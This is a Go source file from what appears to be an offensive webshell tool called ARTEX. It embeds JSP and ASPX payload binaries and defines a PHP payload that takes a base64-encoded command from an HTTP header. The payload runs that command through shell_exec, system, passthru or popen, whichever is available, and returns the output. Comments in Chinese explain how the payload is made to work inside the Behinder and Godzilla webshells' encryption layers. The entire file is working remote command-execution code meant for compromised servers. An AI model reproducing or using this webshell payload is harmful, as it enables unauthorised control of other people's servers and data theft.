package webshell

// 第三方加密马实际执行的 payload。冰蝎与我们自己的哥斯拉壳都把解密后的字节当
// 「代码/类」加载，所以这里的 PHP 源码、JSP class、C# DLL 就是请求体里的明文。
//
// 三份 payload 都只认 ARTEX 的自定义头（X-Artex-Cmd / X-Artex-Mark），不解析对方
// 的业务参数格式。这样同一份 payload 能穿过冰蝎 3/4 与哥斯拉 4 的加密层，命令
// 通道与原生马完全一致，文件管理脚本可以原样复用。

import _ "embed"

//go:embed assets/jsp/ArtexPayload.class
var jspPayloadBytes []byte

//go:embed assets/aspx/ArtexPayload.dll
var aspxPayloadBytes []byte

// phpPayloadBody 是供 eval 使用的 PHP 源码（不含 <?php）。命令经 base64 放进请求头，
// 结果用随机边界包住回显；执行函数按可用性依次回落。
//
// 冰蝎壳直接执行明文代码，所以 artex_go() 负责 echo；哥斯拉壳会调用 run() 并把
// 返回值再加密，所以 artex_exec() 只返回字符串——两边的边界都保留在返回值里。
const phpPayloadBody = `
function artex_exec() {
    if (!isset($_SERVER['HTTP_X_ARTEX_CMD']) || !isset($_SERVER['HTTP_X_ARTEX_MARK'])) { return ''; }
    $m = $_SERVER['HTTP_X_ARTEX_MARK'];
    $i = strpos($m, '|');
    if ($i === false) { return ''; }
    $b = substr($m, 0, $i);
    $e = substr($m, $i + 1);
    $c = base64_decode($_SERVER['HTTP_X_ARTEX_CMD']);
    $o = '';
    if (function_exists('shell_exec')) {
        $o = @shell_exec($c . ' 2>&1');
    } elseif (function_exists('system')) {
        ob_start(); @system($c . ' 2>&1'); $o = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start(); @passthru($c . ' 2>&1'); $o = ob_get_clean();
    } elseif (function_exists('popen')) {
        $h = @popen($c . ' 2>&1', 'r');
        if ($h) { while (!feof($h)) { $o .= fread($h, 4096); } @pclose($h); }
    } else {
        $o = 'artex: 目标 PHP 禁用了全部命令执行函数';
    }
    return $b . $o . $e;
}
function artex_go() {
    echo artex_exec();
}
`

// phpPayloadBehinder 被冰蝎壳直接 eval，所以自己触发。
const phpPayloadBehinder = phpPayloadBody + `
artex_go();
`

// phpPayloadGodzilla 由哥斯拉壳缓存并调用 run($pms)。源码里保留 getBasicsInfo 字样，
// 官方 PHP 壳据此判断首个请求是 payload 而不是业务数据。
const phpPayloadGodzilla = `/* getBasicsInfo */` + phpPayloadBody + `
function run($pms) { return artex_exec(); }
`
